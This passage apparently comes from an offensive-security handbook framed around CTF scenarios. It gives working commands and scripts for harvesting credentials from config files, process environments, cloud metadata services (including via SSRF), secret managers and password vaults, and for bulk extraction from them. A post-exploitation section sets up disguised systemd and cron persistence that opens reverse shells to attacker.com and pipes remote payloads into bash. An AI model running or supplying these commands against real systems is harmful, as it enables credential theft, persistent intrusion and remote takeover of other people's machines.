# Web application configs
find /var/www -name "config.php" -o -name "settings.py" -o -name "web.config" 2>/dev/null
```

**Development Tools**

```bash
# Git credentials
cat ~/.git-credentials ~/.gitconfig 2>/dev/null
git config --list | grep -i credential

# NPM authentication token
cat ~/.npmrc 2>/dev/null | grep -i "authtoken"

# Composer (PHP)
cat ~/.composer/auth.json 2>/dev/null

# Maven (Java)
cat ~/.m2/settings.xml 2>/dev/null | grep -i "password\|username"
```

**Container Credentials**

```bash
# Docker
cat ~/.docker/config.json 2>/dev/null | jq -r '.auths'
cat /var/lib/docker/containers/*/config.v2.json 2>/dev/null | grep -i "env.*PASS\|env.*KEY"

# Kubernetes
cat ~/.kube/config 2>/dev/null
find / -name "*.kubeconfig" 2>/dev/null

# Podman
cat ~/.config/containers/auth.json 2>/dev/null
```

**Configuration Management**

```bash
# Ansible
cat /etc/ansible/ansible.cfg ~/.ansible.cfg 2>/dev/null
find / -name "*.vault" -o -name "vault-pass.txt" 2>/dev/null

# Terraform
find / -name "terraform.tfstate" -o -name "terraform.tfvars" 2>/dev/null
cat terraform.tfstate | jq -r '.resources[].instances[].attributes | select(.password != null)'

# Chef
find / -name "encrypted_data_bag_secret" 2>/dev/null
cat ~/.chef/credentials 2>/dev/null
```

**Cloud Service Credential Files**

```bash
# AWS
cat ~/.aws/credentials ~/.aws/config 2>/dev/null

# Azure
cat ~/.azure/azureProfile.json ~/.azure/accessTokens.json 2>/dev/null

# Google Cloud
cat ~/.config/gcloud/credentials.db ~/.config/gcloud/application_default_credentials.json 2>/dev/null

# DigitalOcean
cat ~/.config/doctl/config.yaml 2>/dev/null

# Heroku
cat ~/.netrc 2>/dev/null | grep -A2 "machine api.heroku.com"
```

### Backup and Archive Locations

```bash
# Common backup directories
find /var/backups /backup /backups /tmp /var/tmp -type f \( -name "*.zip" -o -name "*.tar.gz" -o -name "*.bak" \) 2>/dev/null

# Database dumps with credentials
find / -name "*.sql" -o -name "*.dump" 2>/dev/null | xargs grep -l "PASSWORD\|IDENTIFIED BY" 2>/dev/null

# Archive extraction for credential search
for archive in $(find /tmp -name "*.zip" -o -name "*.tar.gz" 2>/dev/null); do
    unzip -l "$archive" 2>/dev/null | grep -iE "(config|credential|password|key)"
    tar -tzf "$archive" 2>/dev/null | grep -iE "(config|credential|password|key)"
done
```

## Environment Variable Harvesting

Environment variables frequently contain credentials passed to applications at runtime. Harvesting requires examining multiple sources across the system.

### Current Process Environment

```bash
# Current shell environment
env | grep -iE "(pass|pwd|key|token|secret|api)"
printenv | grep -iE "(pass|pwd|key|token|secret|api)"

# Export all environment variables
export -p | grep -iE "(pass|pwd|key|token|secret|api)"

# Set variables (includes non-exported)
set | grep -iE "(pass|pwd|key|token|secret|api)"
```

### System-Wide Environment Variables

```bash
# Global environment files
cat /etc/environment /etc/profile /etc/bash.bashrc 2>/dev/null | grep -iE "(export.*PASS|export.*KEY|export.*TOKEN)"

# Profile.d scripts
cat /etc/profile.d/* 2>/dev/null | grep -iE "(export.*PASS|export.*KEY|export.*TOKEN)"

# System service environment
cat /etc/systemd/system.conf /etc/systemd/user.conf 2>/dev/null | grep -i "DefaultEnvironment"
```

### Running Process Environments

```bash
# All process environments (requires appropriate permissions)
for pid in /proc/[0-9]*; do
    echo "=== PID: $(basename $pid) ==="
    cat $pid/environ 2>/dev/null | tr '\0' '\n' | grep -iE "(pass|pwd|key|token|secret|api)"
done

# Specific process environment
cat /proc/<PID>/environ | tr '\0' '\n'

# Process environment with process name
ps auxe | grep -v "^USER"
```

### Systemd Service Environments

```bash
# Service unit files
grep -r "Environment=" /etc/systemd/system/ /usr/lib/systemd/system/ 2>/dev/null

# Show service environment
systemctl show <service_name> --property=Environment

# Service status with environment
systemctl status <service_name>

# Extract environment from service files
find /etc/systemd /usr/lib/systemd -name "*.service" -exec grep -H "Environment=" {} \; 2>/dev/null
```

### Container Environment Variables

**Docker**

```bash
# Running container environment
docker exec <container_id> env

# Inspect container configuration
docker inspect <container_id> | jq -r '.[].Config.Env[]'

# All running containers
for container in $(docker ps -q); do
    echo "=== Container: $container ==="
    docker inspect $container | jq -r '.[].Config.Env[]'
done

# Docker Compose environment files
find / -name ".env" -path "*/docker-compose/*" 2>/dev/null
cat docker-compose.yml | grep -A10 "environment:"
```

**Kubernetes**

```bash
# Pod environment variables
kubectl get pod <pod_name> -o json | jq -r '.spec.containers[].env[]'

# ConfigMaps
kubectl get configmap <configmap_name> -o yaml

# Secrets (base64 encoded)
kubectl get secret <secret_name> -o json | jq -r '.data | to_entries[] | .key + "=" + (.value | @base64d)'

# All secrets in namespace
kubectl get secrets -o json | jq -r '.items[].data | to_entries[] | .key + "=" + (.value | @base64d)'
```

### Web Application Environments

**PHP**

```bash
# PHP-FPM pool configuration
cat /etc/php/*/fpm/pool.d/*.conf 2>/dev/null | grep "env\["

# PHP info files (if accessible)
curl http://target/info.php | grep -i "environment"

# WordPress wp-config.php
cat /var/www/*/wp-config.php 2>/dev/null | grep "define"
```

**Node.js**

```bash
# PM2 process manager
pm2 env <app_id>
cat ~/.pm2/dump.pm2 2>/dev/null

# .env files (common in Node.js projects)
find /var/www /opt /home -name ".env" -type f 2>/dev/null
find / -name ".env.local" -o -name ".env.production" 2>/dev/null
```

**Python**

```bash
# Django settings
find / -name "settings.py" 2>/dev/null | xargs grep -l "SECRET_KEY\|PASSWORD"

# Flask configuration
find / -name "config.py" -o -name ".flaskenv" 2>/dev/null

# Python environment management
cat ~/.pypirc 2>/dev/null
```

### Shell Configuration Environment Variables

```bash
# User shell configurations
cat ~/.bashrc ~/.bash_profile ~/.profile ~/.zshrc ~/.zsh_profile 2>/dev/null | grep -iE "^export.*(PASS|KEY|TOKEN|SECRET)"

# Root shell configurations
cat /root/.bashrc /root/.bash_profile /root/.profile 2>/dev/null | grep -iE "^export.*(PASS|KEY|TOKEN|SECRET)"

# Shell history for exported variables
cat ~/.bash_history ~/.*_history 2>/dev/null | grep -E "^export.*(PASS|KEY|TOKEN|SECRET)"
```

### CI/CD Environment Variables

**GitLab CI**

```bash
# GitLab Runner configuration
cat /etc/gitlab-runner/config.toml 2>/dev/null | grep -A5 "environment"

# Project variables (requires API access or filesystem access)
find / -path "*/.git/config" 2>/dev/null | xargs cat | grep -i "gitlab"
```

**Jenkins**

```bash
# Jenkins credentials
cat /var/lib/jenkins/credentials.xml /var/lib/jenkins/secrets/* 2>/dev/null

# Jenkins job configurations
find /var/lib/jenkins/jobs -name "config.xml" 2>/dev/null | xargs grep -l "password\|secret"
```

**GitHub Actions** [Inference]

```bash
# Workflow files (if repository is accessible)
cat .github/workflows/*.yml | grep -A5 "env:"

# Runner environment (if on self-hosted runner)
cat /home/runner/.env 2>/dev/null
```

### Environment Variable Extraction Techniques

**One-Liner Comprehensive Harvest**

```bash
# Collect all environment-related data
{
    echo "=== Current Environment ===";
    env;
    echo "=== Process Environments ===";
    for pid in /proc/[0-9]*; do echo "PID: $(basename $pid)"; cat $pid/environ 2>/dev/null | tr '\0' '\n'; done;
    echo "=== Systemd Services ===";
    grep -rh "Environment=" /etc/systemd /usr/lib/systemd 2>/dev/null;
    echo "=== Shell Configs ===";
    cat ~/.bashrc ~/.profile /etc/profile /etc/environment 2>/dev/null;
} | grep -iE "(pass|pwd|key|token|secret|api|database|db_)" > /tmp/env_harvest.txt
```

**Filtered High-Value Extraction**

```bash
# Focus on common credential patterns
grep -rE "(AWS_ACCESS|AWS_SECRET|AZURE_|GCP_|DATABASE_URL|DB_PASS|API_KEY|SECRET_KEY|TOKEN|PRIVATE_KEY)" \
    /proc/*/environ \
    /etc/environment \
    /etc/systemd \
    ~/.bashrc \
    ~/.profile \
    2>/dev/null | tr '\0' '\n'
```

### Post-Extraction Validation

After harvesting credentials, validation confirms usability:

```bash
# Test AWS credentials
export AWS_ACCESS_KEY_ID="<key>"
export AWS_SECRET_ACCESS_KEY="<secret>"
aws sts get-caller-identity

# Test SSH key
chmod 600 <key_file>
ssh -i <key_file> user@target

# Test API token
curl -H "Authorization: Bearer <token>" https://api.target.com/user

# Test database credentials
mysql -h host -u user -p'password' -e "SELECT version();"
psql "postgresql://user:password@host/database" -c "SELECT version();"
```

---

## Instance Profile Exploitation

### AWS EC2 Instance Metadata Service (IMDS)

**Accessing Instance Metadata**

The Instance Metadata Service provides temporary credentials for IAM roles attached to EC2 instances.

```bash
# IMDSv1 (older, no token required)
curl http://169.254.169.254/latest/meta-data/

# List available IAM roles
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Retrieve credentials for specific role
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE-NAME]
```

**IMDSv2 (Token-based)**

```bash
# Request session token (TTL in seconds)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Use token to access metadata
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Retrieve role credentials
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE-NAME]
```

**Response Structure**

Credentials returned in JSON format:

```json
{
  "Code": "Success",
  "LastUpdated": "2025-10-24T10:30:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2025-10-24T16:30:00Z"
}
```

**Exploitation Techniques**

```bash
# Extract and set AWS credentials
CREDS=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE-NAME])

export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r '.Token')

# Verify credentials
aws sts get-caller-identity

# Enumerate permissions
aws iam get-user
aws iam list-attached-user-policies
```

**SSRF to IMDS**

When SSRF vulnerability exists:

```bash
# Test IMDS access through SSRF
curl "http://vulnerable-app.com/fetch?url=http://169.254.169.254/latest/meta-data/"

# Retrieve credentials via SSRF
curl "http://vulnerable-app.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# For IMDSv2 (more complex, may require multiple requests)
# First get token
curl -X PUT "http://vulnerable-app.com/fetch?url=http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
```

**Pacu Framework for Instance Profile Exploitation**

```bash
# Install Pacu
git clone https://github.com/RhinoSecurityLabs/pacu.git
cd pacu
pip3 install -r requirements.txt
python3 pacu.py

# Import credentials from IMDS
import_keys --all

# Run reconnaissance modules
run iam__enum_permissions
run iam__enum_users_roles_policies_groups
run ec2__enum
```

### Azure Instance Metadata Service

**Accessing Azure IMDS**

```bash
# Retrieve access token (requires API version header)
curl -H Metadata:true \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Alternative resource endpoints
# Azure Resource Manager
resource=https://management.azure.com/

# Azure Key Vault
resource=https://vault.azure.net

# Azure Storage
resource=https://storage.azure.com/
```

**Response Structure**

```json
{
  "access_token": "eyJ0eXAiOiJKV1...",
  "expires_in": "3599",
  "expires_on": "1729768200",
  "not_before": "1729764300",
  "resource": "https://management.azure.com/",
  "token_type": "Bearer"
}
```

**Using Retrieved Tokens**

```bash
# Set token variable
TOKEN=$(curl -H Metadata:true \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  | jq -r '.access_token')

# Query Azure Resource Manager
curl -H "Authorization: Bearer $TOKEN" \
  https://management.azure.com/subscriptions?api-version=2020-01-01

# List resource groups
curl -H "Authorization: Bearer $TOKEN" \
  https://management.azure.com/subscriptions/[SUBSCRIPTION-ID]/resourcegroups?api-version=2021-04-01
```

**Azure CLI with Managed Identity**

```bash
# Login using managed identity
az login --identity

# Get current identity
az account show

# List resources
az resource list

# Access Key Vault secrets
az keyvault secret list --vault-name [VAULT-NAME]
az keyvault secret show --vault-name [VAULT-NAME] --name [SECRET-NAME]
```

### GCP Instance Metadata Service

**Accessing GCP Metadata**

```bash
# Retrieve service account token
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# List service accounts
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/

# Get service account email
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email

# Retrieve scopes
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes
```

**Using Retrieved Tokens**

```bash
# Extract token
TOKEN=$(curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token \
  | jq -r '.access_token')

# Use with gcloud
gcloud auth activate-service-account --access-token-file=<(echo $TOKEN)

# Direct API calls
curl -H "Authorization: Bearer $TOKEN" \
  https://www.googleapis.com/compute/v1/projects/[PROJECT-ID]/zones/[ZONE]/instances
```

---

## Secret Manager Enumeration

### AWS Secrets Manager

**Basic Enumeration**

```bash
# List all secrets
aws secretsmanager list-secrets

# List secrets in specific region
aws secretsmanager list-secrets --region us-east-1

# Describe specific secret
aws secretsmanager describe-secret --secret-id [SECRET-NAME]

# Get secret value
aws secretsmanager get-secret-value --secret-id [SECRET-NAME]

# Get secret value from specific version
aws secretsmanager get-secret-value \
  --secret-id [SECRET-NAME] \
  --version-id [VERSION-ID]
```

**Advanced Enumeration**

```bash
# List secrets with filters
aws secretsmanager list-secrets \
  --filters Key=name,Values=prod

# Get secret metadata without value
aws secretsmanager describe-secret \
  --secret-id [SECRET-NAME] \
  --output json

# List all versions of a secret
aws secretsmanager list-secret-version-ids \
  --secret-id [SECRET-NAME]

# Check secret rotation configuration
aws secretsmanager describe-secret \
  --secret-id [SECRET-NAME] \
  --query 'RotationEnabled'
```

**Batch Secret Retrieval**

```bash
# Enumerate and extract all accessible secrets
for secret in $(aws secretsmanager list-secrets --query 'SecretList[*].Name' --output text); do
  echo "=== $secret ==="
  aws secretsmanager get-secret-value --secret-id "$secret" --query 'SecretString' --output text 2>/dev/null || echo "Access Denied"
  echo ""
done
```

**Using Pacu for Secrets Enumeration**

```bash
# Within Pacu session
run secretsmanager__secrets_dump

# Save results
data secretsmanager
```

### AWS Systems Manager Parameter Store

**Parameter Store Enumeration**

```bash
# List all parameters
aws ssm describe-parameters

# Get parameter value (non-encrypted)
aws ssm get-parameter --name [PARAMETER-NAME]

# Get encrypted parameter value
aws ssm get-parameter \
  --name [PARAMETER-NAME] \
  --with-decryption

# Get multiple parameters
aws ssm get-parameters \
  --names [PARAM1] [PARAM2] [PARAM3] \
  --with-decryption

# Get parameters by path
aws ssm get-parameters-by-path \
  --path /production/ \
  --recursive \
  --with-decryption
```

**Batch Parameter Extraction**

```bash
# Extract all accessible parameters
for param in $(aws ssm describe-parameters --query 'Parameters[*].Name' --output text); do
  echo "=== $param ==="
  aws ssm get-parameter --name "$param" --with-decryption --query 'Parameter.Value' --output text 2>/dev/null || echo "Access Denied"
  echo ""
done

# Search for specific patterns
aws ssm describe-parameters \
  --parameter-filters "Key=Name,Option=Contains,Values=password"
```

### Azure Key Vault

**Key Vault Enumeration**

```bash
# List all key vaults in subscription
az keyvault list

# List key vaults in specific resource group
az keyvault list --resource-group [RG-NAME]

# Show specific vault details
az keyvault show --name [VAULT-NAME]

# List secrets in vault
az keyvault secret list --vault-name [VAULT-NAME]

# Retrieve secret value
az keyvault secret show \
  --vault-name [VAULT-NAME] \
  --name [SECRET-NAME]

# List keys
az keyvault key list --vault-name [VAULT-NAME]

# List certificates
az keyvault certificate list --vault-name [VAULT-NAME]
```

**REST API Access**

```bash
# Get access token for Key Vault
TOKEN=$(curl -H Metadata:true \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" \
  | jq -r '.access_token')

# List secrets via REST API
curl -H "Authorization: Bearer $TOKEN" \
  https://[VAULT-NAME].vault.azure.net/secrets?api-version=7.3

# Get secret value
curl -H "Authorization: Bearer $TOKEN" \
  https://[VAULT-NAME].vault.azure.net/secrets/[SECRET-NAME]?api-version=7.3
```

**Batch Secret Extraction**

```bash
# Extract all secrets from accessible vaults
for vault in $(az keyvault list --query '[].name' -o tsv); do
  echo "=== Vault: $vault ==="
  for secret in $(az keyvault secret list --vault-name "$vault" --query '[].name' -o tsv 2>/dev/null); do
    echo "  Secret: $secret"
    az keyvault secret show --vault-name "$vault" --name "$secret" --query 'value' -o tsv 2>/dev/null || echo "    Access Denied"
  done
  echo ""
done
```

### GCP Secret Manager

**Secret Manager Enumeration**

```bash
# List all secrets
gcloud secrets list

# List secrets in specific project
gcloud secrets list --project=[PROJECT-ID]

# Describe secret
gcloud secrets describe [SECRET-NAME]

# List secret versions
gcloud secrets versions list [SECRET-NAME]

# Access secret value (latest version)
gcloud secrets versions access latest --secret=[SECRET-NAME]

# Access specific version
gcloud secrets versions access [VERSION-NUMBER] --secret=[SECRET-NAME]
```

**REST API Access**

```bash
# Get access token
TOKEN=$(curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token \
  | jq -r '.access_token')

# List secrets
curl -H "Authorization: Bearer $TOKEN" \
  https://secretmanager.googleapis.com/v1/projects/[PROJECT-ID]/secrets

# Access secret value
curl -H "Authorization: Bearer $TOKEN" \
  https://secretmanager.googleapis.com/v1/projects/[PROJECT-ID]/secrets/[SECRET-NAME]/versions/latest:access
```

**Batch Secret Extraction**

```bash
# Extract all accessible secrets
for secret in $(gcloud secrets list --format="value(name)"); do
  echo "=== $secret ==="
  gcloud secrets versions access latest --secret="$secret" 2>/dev/null || echo "Access Denied"
  echo ""
done
```

---

## Password Vault Exploitation

### HashiCorp Vault

**Vault Reconnaissance**

```bash
# Check if Vault is accessible
curl http://vault.example.com:8200/v1/sys/health

# Retrieve Vault status
curl http://vault.example.com:8200/v1/sys/seal-status

# List enabled authentication methods
vault auth list

# List enabled secrets engines
vault secrets list
```

**Token-Based Authentication**

```bash
# Login with token
vault login [TOKEN]

# Check token capabilities
vault token capabilities [PATH]

# Lookup token information
vault token lookup

# Renew token
vault token renew
```

**AppRole Authentication**

```bash
# Login with AppRole
vault write auth/approle/login \
  role_id=[ROLE-ID] \
  secret_id=[SECRET-ID]

# Read AppRole role ID
vault read auth/approle/role/[ROLE-NAME]/role-id

# Generate new secret ID
vault write -f auth/approle/role/[ROLE-NAME]/secret-id
```

**Secret Enumeration**

```bash
# List secrets at path
vault list secret/

# Read specific secret
vault read secret/data/[SECRET-NAME]

# Read with specific version
vault read secret/data/[SECRET-NAME]?version=2

# KV v1 engine
vault read secret/[SECRET-NAME]

# KV v2 engine
vault read secret/data/[SECRET-NAME]
vault kv get secret/[SECRET-NAME]
```

**Recursive Secret Extraction**

```bash
# Function to recursively list and extract secrets
extract_vault_secrets() {
  local path=$1
  
  # List keys at current path
  for key in $(vault list -format=json "$path" 2>/dev/null | jq -r '.[]'); do
    if [[ $key == */ ]]; then
      # Directory - recurse
      extract_vault_secrets "${path}${key}"
    else
      # Secret - extract
      echo "=== ${path}${key} ==="
      vault read "${path}${key}" 2>/dev/null
    fi
  done
}

# Usage
extract_vault_secrets "secret/"
```

**Vault Unseal Key Exploitation**

```bash
# Check seal status
vault status

# Attempt to unseal (requires threshold keys)
vault operator unseal [KEY-SHARE-1]
vault operator unseal [KEY-SHARE-2]
vault operator unseal [KEY-SHARE-3]

# Rekey operation (if authorized)
vault operator rekey -init -key-shares=5 -key-threshold=3
```

**Policy Enumeration**

```bash
# List policies
vault policy list

# Read policy content
vault policy read [POLICY-NAME]

# Check current token's policies
vault token lookup -format=json | jq -r '.data.policies'
```

### CyberArk EPV

**CyberArk REST API Authentication**

```bash
# Authenticate and get session token
curl -X POST https://cyberark.example.com/PasswordVault/API/auth/Cyberark/Logon \
  -H "Content-Type: application/json" \
  -d '{
    "username": "username",
    "password": "password"
  }'

# LDAP authentication
curl -X POST https://cyberark.example.com/PasswordVault/API/auth/LDAP/Logon \
  -H "Content-Type: application/json" \
  -d '{
    "username": "username",
    "password": "password"
  }'
```

**Account Enumeration**

```bash
# Search for accounts
curl -X GET \
  "https://cyberark.example.com/PasswordVault/API/Accounts?search=[KEYWORD]" \
  -H "Authorization: [SESSION-TOKEN]"

# Get specific account details
curl -X GET \
  "https://cyberark.example.com/PasswordVault/API/Accounts/[ACCOUNT-ID]" \
  -H "Authorization: [SESSION-TOKEN]"

# List safes
curl -X GET \
  "https://cyberark.example.com/PasswordVault/API/Safes" \
  -H "Authorization: [SESSION-TOKEN]"
```

**Password Retrieval**

```bash
# Retrieve password
curl -X POST \
  "https://cyberark.example.com/PasswordVault/API/Accounts/[ACCOUNT-ID]/Password/Retrieve" \
  -H "Authorization: [SESSION-TOKEN]" \
  -H "Content-Type: application/json"

# Get password with reason
curl -X POST \
  "https://cyberark.example.com/PasswordVault/API/Accounts/[ACCOUNT-ID]/Password/Retrieve" \
  -H "Authorization: [SESSION-TOKEN]" \
  -H "Content-Type: application/json" \
  -d '{"reason": "Incident response"}'
```

**Credential Extraction Script**

```bash
#!/bin/bash
TOKEN="[SESSION-TOKEN]"
BASE_URL="https://cyberark.example.com/PasswordVault/API"

# Get all accessible accounts
accounts=$(curl -s -X GET \
  "${BASE_URL}/Accounts" \
  -H "Authorization: $TOKEN" \
  | jq -r '.value[].id')

# Extract passwords
for account_id in $accounts; do
  echo "=== Account ID: $account_id ==="
  
  # Get account details
  curl -s -X GET \
    "${BASE_URL}/Accounts/${account_id}" \
    -H "Authorization: $TOKEN" \
    | jq -r '.userName, .address, .platformId'
  
  # Retrieve password
  curl -s -X POST \
    "${BASE_URL}/Accounts/${account_id}/Password/Retrieve" \
    -H "Authorization: $TOKEN" \
    | jq -r '.'
  
  echo ""
done
```

### Thycotic Secret Server

**REST API Authentication**

```bash
# Obtain OAuth2 token
curl -X POST https://secretserver.example.com/oauth2/token \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=[USERNAME]&password=[PASSWORD]&grant_type=password"

# Set token
TOKEN="Bearer [ACCESS-TOKEN]"
```

**Secret Enumeration**

```bash
# Search secrets
curl -X GET \
  "https://secretserver.example.com/api/v1/secrets?filter.searchText=[KEYWORD]" \
  -H "Authorization: $TOKEN"

# Get secret by ID
curl -X GET \
  "https://secretserver.example.com/api/v1/secrets/[SECRET-ID]" \
  -H "Authorization: $TOKEN"

# List folders
curl -X GET \
  "https://secretserver.example.com/api/v1/folders" \
  -H "Authorization: $TOKEN"

# Get secrets in folder
curl -X GET \
  "https://secretserver.example.com/api/v1/secrets?filter.folderId=[FOLDER-ID]" \
  -H "Authorization: $TOKEN"
```

**Password Field Extraction**

```bash
# Get secret with password field
curl -X GET \
  "https://secretserver.example.com/api/v1/secrets/[SECRET-ID]?includeInactive=false" \
  -H "Authorization: $TOKEN" \
  | jq -r '.items[] | select(.fieldName=="Password") | .itemValue'
```

**Batch Secret Extraction**

```bash
#!/bin/bash
TOKEN="Bearer [ACCESS-TOKEN]"
BASE_URL="https://secretserver.example.com/api/v1"

# Get all secrets
secrets=$(curl -s -X GET \
  "${BASE_URL}/secrets" \
  -H "Authorization: $TOKEN" \
  | jq -r '.records[].id')

# Extract each secret
for secret_id in $secrets; do
  echo "=== Secret ID: $secret_id ==="
  
  curl -s -X GET \
    "${BASE_URL}/secrets/${secret_id}" \
    -H "Authorization: $TOKEN" \
    | jq -r '.name, .items[] | "\(.fieldName): \(.itemValue)"'
  
  echo ""
done
```

### Windows Credential Manager

**Credential Enumeration (Windows)**

```powershell
# List credentials
cmdkey /list

# Export credentials (requires admin)
rundll32.exe keymgr.dll,KRShowKeyMgr
```

**VaultCmd Usage**

```cmd
# List vault items
vaultcmd /list

# List credentials in specific vault
vaultcmd /listcreds:"Windows Credentials" /all

# List credentials in web vault
vaultcmd /listcreds:"Web Credentials" /all
```

**Mimikatz Credential Extraction**

```cmd
# Run mimikatz
mimikatz.exe

# Enable debug privileges
privilege::debug

# Dump credentials from Credential Manager
vault::list

# Dump vault credentials
vault::cred /patch
```

**PowerShell Credential Extraction**

```powershell
# Import required namespace
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]

# Create vault object
$vault = New-Object Windows.Security.Credentials.PasswordVault

# Retrieve all credentials
$vault.RetrieveAll() | ForEach-Object {
  $credential = $vault.Retrieve($_.Resource, $_.UserName)
  [PSCustomObject]@{
    Resource = $credential.Resource
    UserName = $credential.UserName
    Password = $credential.Password
  }
}
```

### Linux Secret Storage

**GNOME Keyring Exploitation**

```bash
# Check for keyring files
ls -la ~/.local/share/keyrings/

# Dump keyring with seahorse (GUI)
seahorse

# Use secret-tool
secret-tool search --all

# Dump specific attribute
secret-tool lookup service myservice

# List all items
python3 << EOF
import secretstorage
connection = secretstorage.dbus_init()
collection = secretstorage.get_default_collection(connection)
for item in collection.get_all_items():
    print(f"Label: {item.get_label()}")
    print(f"Attributes: {item.get_attributes()}")
    item.unlock()
    print(f"Secret: {item.get_secret()}")
    print("")
EOF
```

**KWallet Exploitation**

```bash
# Check for KWallet files
ls -la ~/.local/share/kwalletd/

# Use kwalletcli
kwalletcli -f [WALLET-NAME] -e [ENTRY-NAME]

# List entries
kwalletcli -l

# Dump all entries (Python)
python3 << EOF
import dbus
bus = dbus.SessionBus()
wallet = bus.get_object('org.kde.kwalletd5', '/modules/kwalletd5')
wallet_iface = dbus.Interface(wallet, 'org.kde.KWallet')

wallets = wallet_iface.wallets()
for w in wallets:
    handle = wallet_iface.open(w, 0, 'CTF')
    folders = wallet_iface.folderList(handle, w)
    for folder in folders:
        entries = wallet_iface.entryList(handle, folder, w)
        for entry in entries:
            value = wallet_iface.readPassword(handle, folder, entry, w)
            print(f"Wallet: {w}, Folder: {folder}, Entry: {entry}, Value: {value}")
EOF
```

**Environment Variable Secrets**

```bash
# Dump all environment variables
env

# Search for common secret patterns
env | grep -iE "(pass|secret|key|token|api)"

# Check process environments (requires root)
for pid in /proc/[0-9]*/; do
  echo "=== PID: $(basename $pid) ==="
  cat "$pid/environ" 2>/dev/null | tr '\0' '\n' | grep -iE "(pass|secret|key|token)"
done
```

**Configuration File Secrets**

```bash
# Common locations for credentials
cat ~/.aws/credentials
cat ~/.azure/config
cat ~/.config/gcloud/credentials.db
cat ~/.ssh/config
cat ~/.netrc
cat ~/.docker/config.json
cat ~/.kube/config

# Search for credential patterns in home directory
grep -r -iE "(password|passwd|pwd|secret|token|api.?key)" ~/ 2>/dev/null \
  --include="*.conf" \
  --include="*.config" \
  --include="*.ini" \
  --include="*.yml" \
  --include="*.yaml" \
  --include="*.json"
```

---

## Important Related Topics

- **Cloud IAM privilege escalation**: Techniques for escalating privileges using obtained credentials
- **Credential stuffing and password spraying**: Using discovered credentials across multiple services
- **Secrets scanning in source code**: Finding hardcoded credentials in Git repositories and configuration management
- **Token theft and session hijacking**: Exploiting valid session tokens beyond initial credential compromise
- **Credential persistence mechanisms**: Maintaining access through credential caching and refresh tokens

---

# Post-Exploitation Techniques

Post-exploitation encompasses actions taken after initial system compromise to maintain access, expand control, extract valuable data, and establish redundant access mechanisms. These techniques enable long-term operation within target environments during CTF scenarios.

## Persistence Establishment

Persistence mechanisms ensure continued access after system reboots, credential changes, or initial access vector closure. Multiple persistence methods increase resilience against detection and remediation.

### Systemd Service Persistence

**Basic Service Creation**

```bash
# Create malicious service unit
cat > /etc/systemd/system/system-update.service << 'EOF'
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF

# Enable and start service
systemctl daemon-reload
systemctl enable system-update.service
systemctl start system-update.service

# Verify persistence
systemctl status system-update.service
```

**Timer-Based Persistence**

```bash
# Create timer unit
cat > /etc/systemd/system/backup-check.timer << 'EOF'
[Unit]
Description=Periodic Backup Check

[Timer]
OnBootSec=5min
OnUnitActiveSec=1h
Unit=backup-check.service

[Install]
WantedBy=timers.target
EOF

# Create corresponding service
cat > /etc/systemd/system/backup-check.service << 'EOF'
[Unit]
Description=Backup Check Service

[Service]
Type=oneshot
ExecStart=/usr/local/bin/backup-check.sh
EOF

# Create payload script
cat > /usr/local/bin/backup-check.sh << 'EOF'
#!/bin/bash
bash -c 'exec bash -i &>/dev/tcp/attacker.com/4444 0>&1' &
EOF
chmod +x /usr/local/bin/backup-check.sh

# Enable timer
systemctl daemon-reload
systemctl enable backup-check.timer
systemctl start backup-check.timer
```

### Cron-Based Persistence

**User Crontab**

```bash
# Add to user crontab (no root required)
(crontab -l 2>/dev/null; echo "*/10 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'") | crontab -

# Alternative payload locations
(crontab -l 2>/dev/null; echo "@reboot /tmp/.system-cache") | crontab -

# Verify crontab
crontab -l
```

**System-Wide Cron**

```bash
# Add to system cron directories
echo "*/15 * * * * root /usr/local/bin/system-health-check" >> /etc/crontab

# Create cron.d file
cat > /etc/cron.d/system-monitor << 'EOF'
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
*/20 * * * * root /bin/bash -c 'curl -s http://attacker.com/payload.sh | bash'
EOF

# Hourly/daily/weekly/monthly scripts
cat > /etc/cron.hourly/update-check << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/attacker.com/4444 0>&1
EOF
